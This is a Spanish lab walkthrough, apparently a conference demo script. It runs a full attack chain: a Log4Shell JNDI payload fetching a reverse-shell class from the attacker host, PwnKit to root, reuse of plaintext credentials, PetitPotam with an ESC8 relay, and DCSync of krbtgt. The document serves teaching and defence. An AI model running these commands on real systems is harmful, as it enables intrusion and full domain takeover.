# Bifrost — Guion de ataque (comando a comando)

Guía exclusiva del **lado atacante**, pensada para estudiar y para el escenario:
qué es cada servicio, qué hace cada comando y qué decir para que **las dos partes
de la mesa queden bien** — el equipo de Tenable y el equipo de red team.

> **Punto de partida.** El atacante (tu host ParrotOS) solo conoce una cosa: hay
> un servicio en `10.10.0.20:8983`. No tiene credenciales, no ve el dominio, no
> ve nada más. Tenable, en cambio, ya escaneó todo y tiene el reporte. La charla
> es el contraste entre **encontrar** (escala, cobertura, priorización) y
> **demostrar** (explotación, cadena, impacto).

---

## 0. Setup del atacante

```bash
source ~/bifrost/env.sh     # carga las variables del laboratorio
cd ~/bifrost
```

| Comando / variable | Qué hace |
|---|---|
| `source ~/bifrost/env.sh` | ejecuta el archivo *en la shell actual* (no en un subshell), así exporta `LHOST`, `TARGET_*`, credenciales y puertos a tu sesión. |
| `cd ~/bifrost` | te sitúa en la raíz del repo (los scripts buscan `config/lab.env` subiendo directorios). |

| Var | Valor | Qué es |
|---|---|---|
| `LHOST` | `10.10.0.66` | tu host (atacante) en VMnet1 |
| `TARGET_WEB` | `10.10.0.20` | web01 (Solr) |
| `TARGET_DC` | `10.10.0.30` | dc01 (AD + ADCS) |
| `TARGET_WS` | `10.10.0.31` | ws01 (Windows 10) |
| `BIFROST_DOMAIN` | `corp.local` | dominio |
| `BIFROST_SOLR_PORT` / `LDAP_PORT` / `HTTP_PORT` / `REVSHELL_PORT` | `8983` / `1389` / `8000` / `4444` | puertos del laboratorio |

---

## 1. El servicio expuesto: Apache Solr

**Qué es.** Solr es un **motor de búsqueda empresarial** basado en Lucene. Se
despliega como un servicio web que expone una **API REST de administración** en
el puerto `8983` (`/solr/admin/...`, `/solr/<core>/...`). Internamente usa
**Log4j2** como biblioteca de *logging* y registra los parámetros que recibe en
las peticiones. Esa combinación —API HTTP de administración + Log4j2— es la que
convierte a Solr en un objetivo clásico de **Log4Shell**.

**Qué es Log4Shell.** Es la vulnerabilidad **CVE-2021-44228** de Log4j2: cuando
la biblioteca registra un texto que contiene una *lookup* JNDI como
`${jndi:ldap://servidor/x}`, **resuelve** esa expresión consultando el servidor
LDAP indicado y **carga y ejecuta** la clase Java que ese servidor le devuelva.
En la práctica: si controlas el servidor LDAP, controlas qué código corre el
objetivo.

**Qué es JNDI.** *Java Naming and Directory Interface*: el mecanismo de Java para
referenciar objetos por nombre a través de LDAP/RMI. El servidor LDAP devuelve
una **referencia** (`javaCodebase`) a una clase; el JVM del objetivo la descarga,
la instancia y ejecuta su bloque estático.

### Reconocimiento

**Lógica del atacante:** no conoces la red; escaneas el único host del alcance y
ves qué contesta.

```bash
nmap -sV -p 8983 "$TARGET_WEB"
```

| Parámetro | Qué hace |
|---|---|
| `-sV` | *version detection*: además de ver el puerto abierto, identifica el servicio y su versión. |
| `-p 8983` | limita el barrido a ese puerto (rapidez; el alcance es uno). |
| `"$TARGET_WEB"` | el host objetivo (`10.10.0.20`). |

```
PORT     STATE SERVICE VERSION
8983/tcp open  http    Apache Solr
```

Ya sabes que es Solr. Pregunta la versión concreta:

```bash
curl -s "http://$TARGET_WEB:$BIFROST_SOLR_PORT/solr/admin/info/system?wt=json" | grep solr-spec-version
```

| Parámetro | Qué hace |
|---|---|
| `-s` | modo silencioso: sin barra de progreso ni mensajes de error a stdout. |
| `/solr/admin/info/system` | endpoint de administración que devuelve información del nodo. |
| `?wt=json` | *writer type*: pide la respuesta en JSON (en vez del formato por defecto). |
| `grep solr-spec-version` | filtra la línea que interesa. |

```json
"solr-spec-version":"8.11.0"
```

> **Speech (los dos lados):**
> **Red team:** *"No sabía nada de esta red. Escaneo el puerto, veo Solr, y la
> versión 8.11.0 me dice que hay Log4j2 vulnerable."*
> **Tenable:** *"Y sin que nadie le dijera dónde mirar: el barrido del escáner
> descubre el 8983 y el plugin de Log4Shell lo marca Crítico (CVSS 10.0) por la
> respuesta HTTP. Eso es cobertura: el operador tuvo que apuntar un host; el
> escáner cubrió toda la red."*

**Contraste con Nessus:** dos caminos a la misma puerta. El escáner llega por
inventario y detección pasiva; el atacante llega por suposición + confirmación de
versión. El escáner da **cobertura**; el atacante, **certeza explotable**.

---

## 2. Puente 1 — Log4Shell → shell

### Cómo lo encuentra el atacante

Versión `8.11.0` + Log4j2 ⇒ candidato a CVE-2021-44228. El atacante monta la
infraestructura JNDI (un servidor LDAP que devuelve su clase) y dispara la
*lookup* contra un endpoint que **loguea** el parámetro. Solr expone
`/solr/admin/cores`, que procesa y registra el parámetro `action`.

### Los tres comandos

**Terminal 1** — compila el payload y levanta los servidores:

```bash
cd ~/bifrost/exploits/log4shell
./build.sh          # compila Exploit.class (reverse shell a $LHOST:4444)
./ldap-serve.sh     # HTTP:8000 sirviendo el .class + LDAP:1389 de marshalsec
```

| Comando | Qué hace |
|---|---|
| `./build.sh` | compila `Exploit.java` → `Exploit.class`: una clase cuyo bloque estático abre una reverse shell hacia `10.10.0.66:4444`. |
| `./ldap-serve.sh` | levanta dos servicios: un `python -m http.server` en `8000` que *sirve* el `.class`, y **marshalsec** (servidor LDAP) en `1389` que devuelve la referencia a ese `.class`. |

**Terminal 2** — el listener que recibirá la shell:

```bash
nc -lvnp "$BIFROST_REVSHELL_PORT"
```

| Parámetro | Qué hace |
|---|---|
| `-l` | *listen*: ponerse a escuchar en vez de conectar. |
| `-v` | *verbose*: muestra la conexión. |
| `-n` | no resuelve DNS (IPs directas). |
| `-p 4444` | puerto local de escucha (debe coincidir con el del payload). |

**Terminal 3** — el disparo:

```bash
curl -g "http://$TARGET_WEB:$BIFROST_SOLR_PORT/solr/admin/cores?action=\${jndi:ldap://$LHOST:$BIFROST_LDAP_PORT/Exploit}"
```

| Parámetro | Qué hace |
|---|---|
| `-g` | *globoff*: **no** interpretar `{}` como patrón glob. Sin esto, curl se come las llaves y Log4j nunca ve la *lookup*. |
| `action=${jndi:ldap://...}` | el valor que Solr registra; al loguearlo, Log4j resuelve la *lookup* y pide la clase a tu LDAP. |
| `/Exploit` | nombre del recurso LDAP que marshalsec mapea a tu `Exploit.class`. |

La shell aparece en la terminal 2, como el usuario del servicio Solr:

```bash
id        # uid=... (solr): usuario de servicio, sin privilegios
hostname  # web01
```

> **Speech (los dos lados):**
> **Red team:** *"Un `curl`. Eso es el acceso inicial: el hallazgo crítico no era
> ruido, era una puerta."*
> **Tenable:** *"Y este es el valor del hallazgo sin credenciales: el escáner lo
> encontró **antes** de que existiera un usuario. Nos dice qué está expuesto;
> el red team nos dice qué pasa cuando alguien lo toca."*

**Contraste con Nessus:** el plugin detecta la versión vulnerable **sin
credenciales**, por inspección HTTP. El atacante tuvo que montar LDAP y disparar.
Ahí está la frontera: el escáner **identifica la condición**; el red team
**convierte la condición en acceso**.

---

## 3. Puente 2 — Privesc: credenciales + PwnKit → root

### El servicio y la vulnerabilidad

**Qué es PwnKit.** Es la vulnerabilidad **CVE-2021-4034** de `polkit`, la
biblioteca de autorización de Linux. El binario `pkexec` (SUID root) maneja mal
`argc/argv`, permite corromper memoria y ejecutar código **como root**. Cualquier
usuario sin privilegios puede dispararla — pero necesita **`argc=0`**, que los
kernels modernos (≥ `5.4.0-124`) mitigan. Por eso `web01` arranca el kernel del
release (`5.4.0-26`).

### Cómo lo encuentra el atacante

Como `solr` (usuario de servicio, sin privilegios) no llegas a root. El primer
instinto es **buscar credenciales** en archivos de configuración del servicio.

```bash
cat /opt/solr/server/solr/intranet/conf/db.properties
```

| Comando | Qué hace |
|---|---|
| `cat` | muestra el contenido del archivo (lectura directa). |
| `.../conf/db.properties` | configuración del *core* de Solr: aquí hay credenciales de una app interna. |

```
db.user=svc_app
db.password=Bifrost2026!
```

Hay un usuario local `svc_app`. Cambias a él:

```bash
su svc_app      # pide la contraseña: Bifrost2026!
```

| Comando | Qué hace |
|---|---|
| `su svc_app` | *switch user*: inicia una shell como `svc_app` (pide su contraseña). |

Ya como `svc_app`, escalas. El exploit quedó **precompilado en `/opt/pk`**
durante la construcción (web01 no tiene internet en la demo):

```bash
cd /opt/pk && ./cve-2021-4034
id
```

| Comando | Qué hace |
|---|---|
| `cd /opt/pk` | entra donde está el PoC precompilado. |
| `./cve-2021-4034` | ejecuta el PoC de PwnKit: abusa de `pkexec` para lanzar una shell root. |
| `id` | confirma que eres `uid=0(root)`. |

```
uid=0(root) gid=0(root)
```

> **Speech (los dos lados):**
> **Red team:** *"Con `solr` no llegaba a root; con una credencial que estaba en
> un archivo, sí. Eso es trabajo de cadena: lo que un hallazgo suelto no dice, la
> cadena lo construye."*
> **Tenable:** *"Y PwnKit es el mejor argumento de por qué el escaneo
> **autenticado** no es opcional: sin credenciales el escáner nunca ve el kernel
> ni `policykit`. El red team encontró esa credencial en la config; el escáner
> la habría usado para ver la casa entera."*

**Detalle técnico (para el ensayo):** verifica el kernel antes.

```bash
uname -r    # debe decir 5.4.0-26-generic
```

Si no precompilaste `/opt/pk` y la VM todavía tuviera red, el fallback es
`git clone https://github.com/berdav/CVE-2021-4034 /tmp/pk && cd /tmp/pk && make && ./cve-2021-4034`.

**Contraste con Nessus:** PwnKit solo aparece en el escaneo **con credenciales**
(checks locales de `policykit`). Este puente es literalmente la demostración de
que "el escáner ve más con credenciales", y de que "el red team consigue esas
credenciales". Cada equipo pone la mitad.

---

## 4. Puente 3 — Lateral: `svc_backup` → ws01

### El servicio

**Qué es SMB.** *Server Message Block*, el protocolo de compartición de archivos
e impresoras de Windows. Con credenciales de dominio, permite autenticarse y
**enumerar recursos compartidos**. Es el equivalente a "entrar a la carpeta
compartida de la empresa".

### Cómo lo encuentra el atacante

Root en `web01` = leer cualquier archivo del sistema. El *deploy* en `/opt/app`
tiene credenciales de dominio en claro.

```bash
cat /opt/app/config.yml
```

```
domain:
  realm: CORP.LOCAL
  bind_user: svc_backup
  bind_password: "Verano2024!"
```

Vuelves a tu host y **validas** esas credenciales contra `ws01`:

```bash
nxc smb "$TARGET_WS" -u "$BIFROST_SVC_USER" -p "$BIFROST_SVC_PASS" --shares
```

| Parámetro | Qué hace |
|---|---|
| `nxc` | *netexec* (sucesor de `crackmapexec`): ejecución de módulos de red. |
| `smb` | protocolo a usar (SMB, puerto 445). |
| `-u` / `-p` | usuario y contraseña de dominio (`svc_backup` / `Verano2024!`). |
| `--shares` | enumera los recursos compartidos visibles para esa cuenta. |

`svc_backup` **no** es administrador de `ws01` (es un usuario de dominio normal),
así que no hay shell aquí. El valor del salto es confirmar que la credencial es
**válida** y leer el share `Compartido` y sus señuelos:

```bash
smbclient "//$TARGET_WS/Compartido" -U "$BIFROST_SVC_USER%$BIFROST_SVC_PASS" -c 'ls'
```

| Parámetro | Qué hace |
|---|---|
| `"//IP/Compartido"` | recurso SMB a abrir (UNC path). |
| `-U 'usuario%contraseña'` | autenticación en una sola cadena (separador `%`). |
| `-c 'ls'` | ejecuta el comando `ls` en el recurso y sale. |

> **Speech (los dos lados):**
> **Red team:** *"Root en una máquina no es el objetivo; el objetivo es el
> dominio. La cuenta de copias viajaba en texto plano. No me da una shell, pero me
> da una credencial de dominio válida, y eso es la llave del siguiente salto."*
> **Tenable:** *"Y el escáner ya lo había marcado como riesgo: credencial en un
> archivo, *share* con permisos amplios, servicios expuestos. El red team puso
> nombre y apellido: esta cuenta, este dominio, este salto."*

**Contraste con Nessus:** aquí el reporte mostraba hallazgos "medios" dispersos
—SMB signing no requerido, permisos amplios en un share, credencial expuesta—.
**Ninguno es crítico por separado.** La cadena los une. El escáner **prioriza**
qué arreglar primero; el red team **demuestra** por qué ese orden importa.

---

## 5. Puente 4 — ESC8 → Domain Admin

### Los servicios y la vulnerabilidad

**Qué es ADCS.** *Active Directory Certificate Services*: la autoridad de
certificados de Windows. **Web Enrollment** es una aplicación IIS en `/certsrv`
que permite solicitar certificados por HTTP, autenticando con NTLM.

**Qué es ESC8.** El abuso de esa configuración: si `/certsrv` acepta **NTLM sobre
HTTP** (sin TLS), un atacante puede **retransmitir** la autenticación del propio
DC a esa web y obtener un **certificado de la cuenta de equipo `dc01$`**. Con ese
certificado obtienes un TGT de `dc01$`, y con él, permiso para **DCSync**.

**Qué es DCSync.** Una técnica que usa la **API de replicación de Active
Directory** (DRSUAPI) para pedir a un DC los *hashes* de cuentas como si fueras
otro DC. El objetivo es el hash de **`krbtgt`**, la cuenta que firma los TGT: con
él se pueden forjar tickets (golden ticket).

### Cómo lo encuentra el atacante

Ya eres un usuario de dominio (`svc_backup`). El DC tiene ADCS con Web Enrollment
sobre HTTP. Eso habilita ESC8.

**Terminal 1** — el relay (escucha en **445/tcp**; `attacker-tools.sh` ya abrió
ese puerto en ufw):

```bash
source ~/bifrost/env.sh
mkdir -p ~/bifrost/loot
ntlmrelayx.py -t "http://$TARGET_DC/certsrv/certfnsh.asp" \
  -smb2support --adcs --template DomainController -l ~/bifrost/loot
```

| Parámetro | Qué hace |
|---|---|
| `-t URL` | objetivo del relay: la web de inscripción que emite el certificado. |
| `-smb2support` | habilita SMB2/3 (lo exige el DC moderno). |
| `--adcs` | modo ADCS: en vez de volcar hashes, **solicita un certificado**. |
| `--template DomainController` | plantilla a usar (la que permite inscribir a `dc01$`). |
| `-l DIR` | carpeta donde guardar el *loot* (el PFX). En impacket 0.12 es `-l`, no `--output-folder`. |

**Terminal 2** — fuerzas al DC a autenticarse contra ti (**coacción**):

```bash
PetitPotam.py -u "$BIFROST_SVC_USER" -p "$BIFROST_SVC_PASS" -d "$BIFROST_DOMAIN" \
  "$LHOST" "$TARGET_DC"
```

| Parámetro | Qué hace |
|---|---|
| `-u` / `-p` | credenciales de dominio (`svc_backup`). |
| `-d` | dominio (`corp.local`). |
| `$LHOST` | **tu** IP: hacia donde el DC se autentica. |
| `$TARGET_DC` | el DC que quieres coaccionar. |

La terminal 1 imprime y guarda el **PFX** de `dc01$`.

**Terminal 3** — el certificado se convierte en identidad (suele llamarse
`DC01$.pfx`):

```bash
certipy auth -pfx ~/bifrost/loot/DC01\$.pfx -dc-ip "$TARGET_DC"
```

| Parámetro | Qué hace |
|---|---|
| `auth` | se autentica usando el certificado. |
| `-pfx` | el certificado de `dc01$` obtenido por el relay. |
| `-dc-ip` | el DC contra el que autenticarse. |

Anota el hash NTLM de `DC01$` y haz DCSync:

```bash
secretsdump.py -just-dc-user krbtgt "$BIFROST_DOMAIN/DC01\$"@"$TARGET_DC" -hashes :<HASH>
```

| Parámetro | Qué hace |
|---|---|
| `-just-dc-user krbtgt` | limita el volcado a esa cuenta (no todo el dominio). |
| `dominio/DC01$@DC` | identidad usada (la cuenta de equipo). |
| `-hashes :NTLM` | autenticación por *hash* en vez de contraseña. |

El hash de `krbtgt` en pantalla es el clímax. Cierra con una shell de
administrador:

```bash
psexec.py -k -no-pass "$BIFROST_DOMAIN/Administrator@$TARGET_DC"
dir C:\Corp\Finanzas
```

| Parámetro | Qué hace |
|---|---|
| `-k` | autenticación **Kerberos** (usa el ticket del *ccache* que generó `certipy`). |
| `-no-pass` | no pide contraseña (usa el ticket). |
| `dominio/Administrator@DC` | identidad y destino. |

> **Speech (los dos lados):**
> **Red team:** *"Ninguna de las piezas de ESC8 es un 10.0: HTTP en vez de HTTPS,
> NTLM en vez de Kerberos, una plantilla que las máquinas pueden inscribir, una
> coacción de autenticación. Juntas son el dominio entero. El escáner no puede
> puntuar 'el conjunto'; el red team sí lo demuestra."*
> **Tenable:** *"Y la ruta ya estaba en el producto: **Attack Path Analysis**
> predijo `svc_backup → ADCS → DC01$ → Domain Admin` antes de que el operador se
> sentara. El red team la ejecutó y la convirtió en una decisión de negocio."*

**Contraste con Nessus:** si tu feed trae el plugin de ADCS, aparece como
configuración insegura; si no, **Attack Path Analysis** de Tenable One modela la
ruta. El escáner **predice**; el red team **verifica**. Ese binomio es la tesis
de la charla.

---

## 6. Impacto controlado

```bash
# dentro de la shell en dc01
type C:\Corp\Finanzas\Q4_Forecast_2026.txt
```

| Comando | Qué hace |
|---|---|
| `type` | muestra el contenido de un archivo (equivalente a `cat` en Windows). |

Lee una línea y **para**. Nada de cifrar, borrar ni exfiltrar.

> **Speech (los dos lados):**
> **Red team:** *"El impacto se demuestra leyendo un archivo. No hace falta nada
> más, y no vamos a hacerlo."*
> **Tenable:** *"Y ese archivo es la prueba de que el riesgo era real: no es un
> puntaje, es un dato de negocio en manos de quien no debería tenerlo."*

---

## 7. Timeline del speech (30 min)

| Min | Momento | Frase clave (equilibrada) |
|---|---|---|
| 00:00 | Hook | *"¿Cuál de los 47 críticos me da el dominio?"* |
| 03:00 | El qué (Tenable) | *"el producto dice que la ruta existe; cubre lo que un humano no alcanza a barrer"* |
| 08:00 | Puente 1 | *"un `curl`: el hallazgo sin credenciales se vuelve acceso"* |
| 12:00 | Puente 2 | *"sin credenciales veo la puerta; con ellas, la casa"* |
| 15:00 | Puente 3 | *"la credencial viajaba en texto plano; el reporte ya lo marcaba"* |
| 19:00 | Puente 4 | *"ninguna pieza es un 10.0; juntas son el dominio"* |
| 24:00 | Impacto | *"se demuestra leyendo"* |
| 26:00 | Blue team | *"cada puente dejó su firma en los logs"* |

---

## 8. Cierre (el speech que deja bien a los dos)

> **Red team:** *"El escáner responde '¿qué está roto y por dónde empiezo?'.
> Nosotros respondemos '¿cuánto duele?'. Sin el escáner, priorizamos a ciegas;
> sin nosotros, el reporte es una lista de tareas sin impacto."*
>
> **Tenable:** *"Y sin cobertura, el red team solo ve el host que alcanza a
> tocar. La combinación —visibilidad priorizada + validación de explotabilidad—
> es lo que convierte un reporte en una decisión."*

---

## Anexo — atajos por si te quedas en blanco

```bash
source ~/bifrost/env.sh                            # recargar variables
cd ~/bifrost/exploits/log4shell && ./selftest.sh   # ¿el puente 1 sigue vivo?
uname -r                                           # kernel correcto para PwnKit
ls ~/bifrost/loot/                                 # ¿el PFX de ESC8 (DC01$.pfx) existe?
```

**Frase comodín** (ensáyala):

> *"Esto es exactamente lo que pasa en producción: el exploit no siempre funciona
> a la primera. Se cambia de técnica y se sigue."*
